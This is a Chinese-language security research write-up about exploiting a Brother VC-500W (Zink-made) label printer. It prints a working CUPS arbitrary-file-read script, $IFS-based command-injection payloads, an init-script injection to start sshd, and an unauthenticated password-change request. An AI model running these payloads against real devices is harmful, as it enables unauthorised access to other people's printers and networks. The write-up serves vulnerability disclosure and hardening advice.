# Brother VC-500W 打印机
> IOTsec-Zone
> 来源：https://www.iotsec-zone.com/article/472

如果您只想利用:zinkpwn

我们的主角是 Brother 品牌的 VC-500W。安装打印机时，我发现它暴露了一个彻头彻尾的中世纪版本
的 CUPS。这种体验就像是从抽屉里拿出一部旧的 Android 手机，惊讶于它的界面有多么陈旧。你还记
得 CUPS 曾经有那个糟糕的渐变导航栏吗？

![0.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8f2xq17xdtwhmwi.png)

这唤起了我脑海中的某些东西，立即让我想要更加深入地去研究一下，因为一台全新的设备竟然配备了
2012年版本的CPUS？这令人感觉有些蹊跷。

# 实际上，这真的相当的糟糕
初始化设置包括一个单独的网络Wi-fi设置按钮，后台使用了一些 CGI 脚本来进行配合处理。

![1.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8fvdjr7p8htakcb.png)

这这个过程中，我发现了一些奇怪的事情，例如：用于连接到指定wifi网络的非常长的GET请求:

```
http://192.168.247.17/wificonfig?page=4&
password=bWFkZXVsb29rISEK&
number=01&
Address=D6%3A01[snip]&
ESSID=[snip]& Encryption_key=on&
IE0_label=WPA+Version+1&
IE0_Group_Cipher=CCMP&
IE0_Pairwise_Ciphers=CCMP&
IE0_Authentication_Suites=PSK&
IE1_label=[snip]&
IE1_Group_Cipher=CCMP&
IE1_Pairwise_Ciphers=CCMP&
IE1_Authentication_Suites=PSK&
Quality=100%2F100&
selected_ap=[snip]+(100%2F100)
```
但我暂时忽略了他们，继续往下研究，我检查了mikrotik以查看打印机从DHCP服务器获取的租约，并
且...

![2.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8gmvft4pjelwx9b.png)

抱歉,我起初没有注意到整个字符串，后来在关闭多余的窗口时才发现这一点。我一看就傻眼了：CUPS
版本已经有 10 多年的历史了，Linux 内核也几乎老到可以喝酒的年纪，而这些都在一个 ARMv5 上运
行。这是在一个仍在生产的设备上，你现在还可以买到它。

现在我必须去调研一下。

初步的调研包括从网上检索相关设备，看看是否有人曾尝试去破解它。我发现的唯一结果是这个github
repo,它表面上提供了一些有用的信息，，主要是关于它们托管固件的位置。实际上，升级包是.tgz.gpg
格式，这……并没有告诉我太多信息，但仍然让人感到精神上的痛苦。我现在没有用到这些，但它们肯
定会在以后派上用场。

另外，我还检索量该年份的CUPS漏洞，事实证明，我的版本是最后一个容易受到任意文件读/写漏洞。
（通常被误归功于 CVE-2012-5519）仍然存在的版本。通过一些Copy as cURL 的技巧，我准备了一个
脚本：

exp.sh，一个通用的脚本，用于通过 CUPS 漏洞获取任何文件

```
#!/bin/bash
if [[ ! "$1" ]];
echo "usage: $0 "
fi
curl 'http://192.168.247.17:631/admin/' -X POST \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Cookie: org.cups.sid=1862ff74a0c01dd0fb444934e7e67e05' \

--data-raw 'org.cups.sid=1862ff74a0c01dd0fb444934e7e67e05&OP=configserver&CUPSDCONF=LogLevel+debug%0D%0ASystemGroup+root%0D%0AGroup+3003%0D%0AServe
rAlias+*%0D%0A%23+Allow+remote+access%0D%0APort+631%0D%0AListen+%2Fvar%2Frun%2Fc
ups%2Fcups.sock%0D%0ABrowsing+On%0D%0ABrowseOrder+allow%2Cdeny%0D%0ABrowseAllow+
all%0D%0ABrowseLocalProtocols+all%0D%0ABrowseWebIF+No%0D%0AMaxJobs+8%0D%0AMaxCli
ents+5%0D%0AMaxLogSize+5000000%0D%0APreserveJobFiles+No%0D%0APreserveJobHistory+
Yes%0D%0ADefaultAuthType+Basic%0D%0ADefaultEncryption+Required%0D%0AWebInterface
+Yes%0D%0APageLog+%2F'"$1"'%0D%0A%3CLocation+%2F%3E%0D%0A++%23+Allow+remote+admi
nistration...%0D%0A++Order+allow%2Cdeny%0D%0A++Allow+all%0D%0A%3C%2FLocation%3E%
0D%0A%3CLocation+%2Fadmin%3E%0D%0A++%23+Allow+remote+administration...%0D%0A++Or
der+allow%2Cdeny%0D%0A++Allow+all%0D%0A%3C%2FLocation%3E%0D%0A%3CLocation+%2Fadm
in%2Fconf%3E%0D%0A++%23+Allow+remote+access+to+the+configuration+files...%0D%0A+
+Order+allow%2Cdeny%0D%0A++Allow+all%0D%0A%3C%2FLocation%3E%0D%0A%3CPolicy+defau
lt%3E%0D%0A++JobPrivateAccess+default%0D%0A++JobPrivateValues+default%0D%0A++Sub
scriptionPrivateAccess+default%0D%0A++SubscriptionPrivateValues+default%0D%0A++%
3CLimit+All%3E%0D%0A++++Order+allow%2Cdeny%0D%0A++++Allow+all%0D%0A++%3C%2FLimit
%3E%0D%0A%3C%2FPolicy%3E%0D%0A%3CPolicy+authenticated%3E%0D%0A++JobPrivateAccess
+default%0D%0A++JobPrivateValues+default%0D%0A++SubscriptionPrivateAccess+defaul
t%0D%0A++SubscriptionPrivateValues+default%0D%0A++%3CLimit+All%3E%0D%0A++++Order
+allow%2Cdeny%0D%0A++++Allow+all%0D%0A++%3C%2FLimit%3E%0D%0A%3C%2FPolicy%3E%0D%0
A&SAVECHANGES=Save+Changes' >/dev/null
# sorry for this being so long, i have no way to format it sanely x.x
until curl -s http://192.168.247.17:631/admin/log/page_log; do
:
done
```

我发现的 PoC 使用了ErrorLog指令，这会在文件中附加很多无用信息。在我的测试过程中，我不小心
对 /etc/passwd 做了这个操作；幸运的是，因为 CUPS 不会截断文件，所以没有造成任何损害。后来我
发现，使用 PageLog 可以达到同样的效果，而且几乎不会损害文件。我们稍后会讨论这个“几乎”。
passwd，删除尾随垃圾以提高可读性

```
root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:100:sync:/bin:/bin/sync
mail:x:8:8:mail:/var/spool/mail:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
operator:x:37:37:Operator:/var:/bin/sh
haldaemon:x:68:68:hald:/:/bin/sh
dbus:x:81:81:dbus:/var/run/dbus:/bin/sh
ftp:x:83:83:ftp:/home/ftp:/bin/sh
nobody:x:99:99:nobody:/home:/bin/sh
sshd:x:103:99:Operator:/var:/bin/sh
default:x:1000:1000:Default non-root user:/home/default:/bin/sh
```
很遗憾，/etc/passwd 并没有提供特别有趣的信息。我还尝试了 /etc/shadow，但没有发现任何密码哈
希。不过，/bin/sh 的内容更有价值：

```
domi@zork:~/projects/bro$ file sh
sh: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked,
interpreter /lib/ld-uClibc.so.0, stripped

domi@zork:~/projects/bro$ strings sh | grep -i busy
-r Try to remount devices as read-only if mount is busy
busybox
Usage: busybox [function] [arguments]...
or: busybox --list[-full]
BusyBox is a multi-call binary that combines many common Unix
link to busybox for each function they wish to use and BusyBox
BusyBox v1.19.4 (2018-05-14 11:11:59 EDT)
crond (busybox 1.19.4) started, log level %d
anonymous:busybox@
syslogd started: BusyBox v1.19.4
%s busy - remounted read-only
fsck (busybox 1.19.4, 2018-05-14 11:11:59 EDT)
```
如我所料，它是一个古老版本的 BusyBox。我考虑过利用 ErrorLog 来利用 BusyBox 中的
nc（netcat），并将一个远程 shell 附加到某个初始化脚本中，但我决定先看看 CGI 方面的情况。

# 供应商的惊喜
在初始设置之后，工具的功能扩展提供了一些额外的设置选项。我们可以重命名共享打印机（遗憾的
是，这里没有注入的可能性），而且…可以设置自定义 TLS 证书？

![3.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8jaxw5bte4giq7z.png)

我很快发现，在任何输入字段中使用 $(), `，甚至只是 ; 都可能导致代码执行。
用于获取输出的小脚本；下载 CSR 并使用 OpenSSL 解析它

```
rm generated.csr
wget http://192.168.247.17/generated.csr
cat generated.csr | openssl req -noout -text
```

![4.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8jrvejz1dqe8kde.png)

值得注意的是，发现这还不是最终结果。我的字符集非常有限，这使得启动反向 shell 非常困难。通过
反复试验，我发现不能使用斜杠（oof.）和空格（OOF.），但$和{}却没有问题。

# 环境变量，我的挚爱
当我在利用漏洞时不能使用某个特定字符时，我最喜欢的技巧是退后一步，看看我们已有的资源。很多
时候，你可以在 $PS1 或其他常见的环境变量中找到你需要的东西。就我来说，$IFS（内部字段分隔
符！你的 shell 可能用它来在循环等操作中分隔文本）非常有效。我用它来在参数之间插入空格。

```
./generic.sh 'http://192.168.247.17/cgi-bin/certmgr/generate_request?'\
'C=AT&'\
'ST=b&'\
'L=d"$(head${IFS}-n1${IFS}/etc/passwd|cat)"&'\
'O=asdf&'\
'OU=meow&'\
'CN=uwu&'\
'emailAddress=ja%40sdomi.pl&'\
'Generate=Generate'
```
在某个时刻，我搞砸了一些东西。或者说，我以为我搞砸了——我的漏洞利用仍然有效，但管理员页面
上的许多东西都为空。我怀疑自己在发出的某个请求中破坏了什么，所以我重启了设备。结果这成为了
一个严重的错误，因为重启后，CGI 管理界面无法启动，CUPS 也只部分正常工作（管理页面返回 500
错误）。哎。

我最后运行的命令是尝试将 /etc/passwd 复制到其他位置，以查看那个地方是否可写。我怀疑自己搞砸
了，可能破坏了 /etc/passwd，这让这导致我进入了一个长达一小时来修复它。

假设：/etc/passwd 现在已经损坏，但我可以利用 CUPS 的漏洞来重新创建它，对吧？当通过 PageLog
检索 /etc/passwd 时，它看起来像是一些随机的二进制文件，所以这个想法至少听起来有些合理。不幸
的是，经过一个小时的尝试，我发现之前的 CUPS 漏洞不再有效——配置文件不再被写入了。

我深入调查了一下。CUPS 显然包含了两种不同的编辑配置的方法——一种是通过向 /admin/ 发起表单
POST 请求（这已经不再有效），另一种是通过向 /admin/conf/ 发起 PUT 请求。此外，我还可以通过
GET 请求相同的文件来检查其内容。

我再次获取了 /etc/passwd。它的末尾有一些垃圾数据，但这没关系（常见的解析工具对语法非常宽
容）。所以，可能是其他地方出了问题……

拥有在 /etc/cups/ 目录内的任意写入权限（我尝试了经典的 /admin/conf/%2e%2e%2fpasswd，但它
并没有漏洞），我开始思考如何利用这一点来获得远程代码执行（RCE）并修复我所破坏的内容。我考
虑过重写 printers.conf，然后利用 CUPS 过滤器来直接获取 shell，或者获得系统任意位置的文件写入
权限，并利用这些权限来获取 shell。

我在本地创建了一个测试的 CUPS 环境。我花了几个小时尝试获得简单的任意文件写入权限，但即使在
CUPS 配置中拥有所有自由，我也没有成功。最终，我放弃了在利用链中使用过滤器——很可能我可以
通过它们获得某些东西，但我对 CUPS 的理解不够深入，而且我不太想进一步学习有关打印机的知识。

作为最后的尝试，我回到了最初的想法——利用 ErrorLog 实现任意文件写入。我发现 CUPS 1.6.1 在记
录错误时不正确地解析 URL，因此我可以将 %0a 转换为真正的换行符。这很不错，但我仍然需要找到
一个合适的文件来利用这个漏洞……

# 装满数据 S3 存储桶
只有当你在遇到需要猜测文件名的漏洞时，才会真正体会到文件列表的重要性。但是，如果我可以在没
有任何限制的情况下直接查看基础镜像会怎么样呢？

![5.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8ml9j1mr6g4rgec.png)
我一开始找到的 GitHub 仓库提供了一个链接，指向了 [http://cdn.zinkapps.com/](http://cdn.zinkapps.com/)。看起来请求根路径
/ 可以得到完整的文件列表，至少截至 2024-06-29 是这样。列表的最上面有一些元文件，然后是一些
Web 界面的元素，接着是一些日志文件（？？？），最后是大量的 .tgz.gpg 文件。.gpg 扩展名似乎是
伪造的——根据 file 命令，这些文件只是经过 OpenSSL 加密的。这使得它们更容易加密和解密，但与GPG 不同，密钥是对称的；如果找到了解密密钥，制作自己的升级包将变得非常简单。

![6.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8mvbf9umodtzxbz.png)
不过，我可能还是需要逆向工程其中一个本地二进制文件才能找到密钥。幸运的是，运气站在我这边！
很多文件同时以 .tgz.gpg 和普通 .tgz 格式上传了。哎呀？

# 让我们来探索吧
我下载了一个名为 zinkupgrade-latest.tgz 的文件，最后修改时间是 2021 年 5 月。如果你有兴趣在家
里尝试一下，它可以在这里找到。
这个系统是一个自定义的 Buildroot 环境，软件选择有些特殊。他们嵌入了 BusyBox 和 Microperl 来
节省空间，但却使用了完整版本的 OpenSSH、OpenSSL 和 CUPS。我只能推测这个项目经过了许多薪
水不高的工程师处理，这与我在文件中发现的情况确实一致。

/etc/init.d/S91zink 的摘录

```
# Check hardware id nibble.
if devmem 0xf0000ede | grep '[8A].$' > /dev/kmsg
then
MODEL=wedge
# Zink electronics driver module.
insmod /etc/zbe_printer_W.ko
elif devmem 0xf0000ede | grep '[9].$' > /dev/kmsg
then
MODEL=turbob
insmod /etc/zbe_printer_T.ko
fi
```
初始化脚本中提到了一些名为“Wedge”和“Turbob”的设备，一些配置文件也专门为“hAppy”设置。搜索
“hAppy”会引导我到 zink.com 网站。

哦，真是的。看来 Zink 是原始设备制造商（OEM），而 Brother 只是把自己的logo和品牌贴在上面。
真可耻！
从我最不喜欢的一个亚马逊网站（Amazon）的产品评论网站来看。第一条评论来自 2015 年左右。我
不确定 zink 是从一开始就授权这款打印机，还是后来开始的因为它没有卖 - 但似乎他们有一个特定的设
计，他们很乐意尽可能长时间地榨取它，而且尽可能便宜。

总之，在我思考了资本主义之后，我决定将文件设置为 S91zink，并将 ErrorLog 文件设置为
/etc/init.d/S91zink，然后调用了一个不存在的 URL [http://192.168.247.17:631/%0a/usr/sbin/sshd%0](http://192.168.247.17:631/%0a/usr/sbin/sshd%0)
a。为了确保清楚，我将 ErrorLog 恢复为默认设置，并重启了打印机。
…它再也没有启动。我感到很困惑，但已经天亮了，所以我决定休息一下。第二天，我得找到 UART 来
修复它。

# 拆卸

本部分包含有关设备的物理详细信息;
这台打印机不会因为易于用户维修而获奖。兄弟公司的用户文档也没有提到关于打开设备进行维护的任
何信息，所以我只能靠自己。
如果纸盒被取出，从底部可以看到三个螺丝。但这些螺丝并不是问题所在——它们只是固定纸盒的组
件。问题在于：没有其他可见的螺丝，而虽然白色侧面板上有几个卡扣，但在这种状态下尝试撬开侧面
板却没有成功。
用尽了所有想法并且急于找到答案，我飞到日本，尝试分析机壳的其他部分。我本来没指望在黑色顶部
部分下面会有任何东西，但还是出于好奇把它撬开了。

![7.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8olm37zpuvodv1m.png)

……令我大吃一惊的是，竟然发现了螺丝！另外，友情提示：看来你可以不用撬棍就能把顶部拆下——
设备底部后面有一个小孔（我认为）可以通过这个孔插入螺丝刀来推开顶部。给 Zink 点个赞，设计很
不错！

![8.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8oyctjfyywh5sto.png)
在拆下第二层塑料之后……我们看到了更多一点，但仍然不多。透过一个孔，我发现了我们的‘奖励’，四
个看起来像是 UART 接口的焊点。

![9.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8pfmhmy9cvl71jw.png)

为了拆下第三层塑料，你必须移除前面的纸张感应器——它下面还有两个螺丝。之后，白色的侧壁应该
就能向上滑动了。

![10.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8pugv94dgzxg1uc.png)

![11.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8q4t0hqokbrcmdy.png)

# 修复故障，出了什么问题？
有了 UART，我进入了 shell。在启动过程中，我还发现相同的 UART 接口提供了对U-boot 的无限制访
问，这在将新内核移植到设备时可能会派上用场（如果有人想做这件事的话）。

![12.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8qmaohw5qzwv6za.png)

很快找到了我破坏的地方：一些 init 文件无法执行。还记得我写过 CUPS 的 PageLog 指令几乎未标记
文件时吗？...嗯，它改变了权限。

```
# mount
rootfs on / type rootfs (rw)
ubi0 on / type ubifs (rw,relatime)
proc on /proc type proc (rw,relatime)
devpts on /dev/pts type devpts (rw,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /tmp type tmpfs (rw,relatime,size=61440k)
sysfs on /sys type sysfs (rw,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
ubi1_0 on /local type ubifs (rw,relatime)
```
是的，默认情况下，整个 rootfs 以读/写方式挂载。危险！
# 固件的进一步分析
在写这篇博客时，我发现自己在阅读各种初始化脚本和microPerl 程序，以仔细检查自己和我之前的假
设。多亏了这一点，我发现了......关于固件的更多奇怪之处：

### 密码身份认证
密码更改调用。呀，未经身份验证的密码更改！

```
curl http://192.168.247.17/cgi-bin/postdata \
-d 'passwordStr=uwu'
```
这个设备上的管理员密码总体上是个有趣的存在。它以未哈希、未加密的形式存储在
/etc/www/config/webconfig.xml 文件中；至少，它是针对每个设备单独设置的，并且还会打印在底部
标签上！
...或者至少我希望它是按设备计算的......
从我的设备转储webconfig.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<config>
<password_chk_str>true</password_chk_str>
<password_str>meow</password_str>
<geo_location>0.0,0.0</geo_location>
<airprint_etag>0.00</airprint_etag>
</config>
```

缩进会受到影响，因为 /system/www/scripts/setDeviceInfo 使用 sed ;-; 编辑此文件。
网页界面验证密码的方式更是奇葩。前端会发起一个 GET 请求到 /cgi-bin/getdata?checkPassword，
然后一个microPerl 脚本……用 awk 解析 webconfig.xml，并返回结果。第一个脚本再把这个值放到一
个 gulp 在浏览器中被评估的地方：

 GET /cgi-bin/getdata？checkPassword的响应
 

```
var isSetPassword=true;
var checkPassword=true;
```
如果 checkPassword 为 true，则前端将密码 POST 到 /cgi-bin/postdata。如果匹配，用户将获得重定
向，并且一些粗制滥造的 JS 代码会使用密码设置 cookie。大家接着正常进行他们的一天。

时：如果 checkPassword 被设置为false，密码永远不会被检查；这只是前端的一个表面改动：无论设
置如何，后端永远都不会检查 cookie！！身份验证仅仅是对浏览器的一个骗局，任何请求的失败都能打
破这个骗局。一些子页面，像 /certs.html 假设你必须要经过身份验证的过程，所以……它们甚至从来不
会检查 cookie！

我简直无法想出更糟糕、更诅咒的‘身份验证’流程。如果我再努力想象也做不出这么差的方案。这在
2024 年显然是极其糟糕的，但在发布那天的已经非常糟糕了。

# 仔细查看 postdata
通过 Web 界面公开的绝大多数数据是通过 getdata 请求的，并通过 postdata 修改的。这两个都是
microPerl 脚本，它们处理请求数据的解析和清理，然后调用另一个 microPerl 脚本来执行实际的读取/
写入。

```
# (...)
my $nextPage = "";
$ENV{'REQUEST_METHOD'} =~ tr/a-z/A-Z/;
if ($ENV{'REQUEST_METHOD'} eq "POST")
{
&parseDataPost;
print "Location: $nextPage\n\n";
}
exit(0);
# (...)
```
这个文件一开始包含一些与环境解析无关的粘合代码，然后立刻检查 CGI 的 REQUEST_METHOD 变
量。注意这个 if 语句中的 print 语句.

```
sub parseDataPost {
local ($buffer, @pairs, $pair, $name, $value);
read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
# Split information into name/value pairs and decode url-encoded data.
@pairs = split(/&/, $buffer);
foreach $pair (@pairs)
{
($name, $value) = split(/=/, $pair,2);
$value =~ tr/+/ /;
$value =~ s/%(..)/pack("C", hex($1))/eg;
&writeToFile($name,$value);
}
}
```

接下来调用 parseDataPost，它只是逐个反序列化 POST 参数。注意 foreach 里面的廉价 urldecode...

```
sub writeToFile {
my $str = $_[1];
if($_[0] eq "passwordStr") {
$str = changeEscapeStr($str);
$str =~ s/&/\\&/g;
&setVars("password_str",$str);
} elsif($_[0] eq "printerName") {
&setVars("printer_name",$_[1]);
} elsif($_[0] eq "printerLoc") {
&setVars("printer_loc",$_[1]);
} elsif($_[0] eq "geoLoc") {
&setVars("geo_location",$_[1]);
} elsif($_[0] eq "cropEnabled") {
&setVars("crop_enabled",$_[1]);
} elsif($_[0] eq "NextPage") {
$nextPage = $_[1];
} elsif($_[0] eq "clearPassword") {
&clearPassInfoVars();
} elsif($_[0] eq "checkPassword") {
if(changeEscapeStr($_[1]) eq &getVar("password_str")){
&setVars("password_chk_str",true);
} else {
&setVars("password_chk_str",false);
}
}
}
```

继续往下看，writeToFile 决定如何处理输入。如果名称是 NextPage，则会设置一个变量，而没有进一
步的检查……嘿，你察觉到了这段代码有潜在风险吗？

![13.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8uhrixrczagsjno.png)

NextPage 存在数据注入漏洞！虽然它是反射型的，所以我们不能从中获得太多实质性的信息，但看到
这种情况仍然很有趣。

```
sub changeEscapeStr {
my $str = $_[0];
$str =~ s/&/&amp;/g;
$str =~ s/</&lt;/g;
$str =~ s/>/&gt;/g;
$str =~ s/"/&quot;/g;
$str =~ s/'/&apos;/g;
$str =~ s/\*/&#x2a;/g;
# $str =~ s/&/\\&/g;
return $str;
}
```

不知何故，即使存在所有这些问题，我们仍然无法获得免费的 RCE。在少数地方，固件通过引号巧妙地
得以保护，而在至少一个地方则是通过参数分割。尽管如此，这些代码依然不够好。

整个冒险过程中最令人瞠目结舌的部分，或许就是看到基础镜像是多么的混乱和杂乱。像 /etc/www 这
样的结构，混乱的符号链接将不同的目录互相连接，看起来毫无目的，以及随意丢弃的东西，完全没有
对整个系统如何运作的理解等等。

![14.png](https://www.iotsec-zone.com/api/image/v2/20240829/d3s8vgk4g6ioieoce0.png)

对于不熟悉的人来说，ko 文件是内核对象，也就是内核模块。简单来说，模块可以扩展内核的功能，
使其能够与额外的设备进行通信（因此，它们实际上是驱动程序）。在常见的系统中，这些模块通常位
于 /lib/modules/ 下的特定目录结构中，由侦听硬件更改的进程加载。/etc 是...对于内核模块来说，这
是一个相当不寻常的地方。

```
# Load WiFi module.
if lsusb | grep 0bda:0179 > /dev/null
then
# Brother rtl8188eu
insmod /etc/8188eu.ko rtw_tx_pwr_lmt_enable=1 rtw_tx_pwr_by_rate=1
elif lsusb | grep 0bda:f179 > /dev/null
then
# Brother rtl8188fu ( Gabe's modified version 2/5/2021 )
insmod /etc/8188fu.ko rtw_tx_pwr_lmt_enable=1 rtw_tx_pwr_by_rate=1
else
# hAppy *** obsolete unless we retain WEXT for rtl8188eu
insmod /etc/8192cu.ko
fi
```
其中一个初始化文件提到这两个文件，以及另一个文件。虽然我们无法确切确定这些模块的来源，但这
个 GitHub 仓库是我最好的猜测。该代码以 GPL-2.0 许可发布，而初始化文件提到一个‘修改版本’……我
闻到了许可违规的味道吗？:^

# 固件升级流程

我没有像我想的那样深入研究这个问题（原因是没时间）；cgi-bin 里有一个 microPerl 脚本处理下
载，然后 /usr/bin/upgrade 负责解密和解压镜像。值得注意的是，旧文件不会被删除，这使得更改的
持久化变得非常简单——即使在测试升级后，我的 sshd 仍然能启动 :3c。

我不需要深入研究固件加密，所以我只知道密钥在升级可执行文件中的某个位置进行了硬编码。同样，
我只浏览了 certmgr 二进制文件，它赞助了整个漏洞 - 我将这两件事留给读者作为摘录。

# 现在怎么办呢？
我不知道！虽然所有这些设备都不安全，但（谢天谢地）他们对云连接的依赖很少——除了从 AWS S3
获取更新之外，没有什么看起来像是向外传递数据。这限制了大多数攻击向量到局域网内。Zink 显然不
在乎安全问题——他们不仅在将近 10 年内没有发布安全更新，而且他们的固件在发布当天就已经存在
漏洞。此外，他们自己的软件存在明显的漏洞，有些部分缺失或匆忙实现。这是‘物联网中S代表安全’教
科书式的例子。

拥有 root 权限后，可以实现一些解决方案来缓解这些安全问题，从而使设备变得稍微不那么容易被攻
陷。因此，我认为如果你拥有这些设备，可以尝试以下方法：黑进设备，禁用远程 CUPS 配置编辑，并
彻底禁用 lighttpd。这应该能在一定程度上提高安全性，至少对我所描述的漏洞有效。
我自己正在制作一个小型应用程序，允许从设备本身的 Web 服务器直接打印标签，因为这最终将减少
我将来必须接触 CUPS 的次数。当它准备好时，它会被推送到漏洞利用仓库 ：3
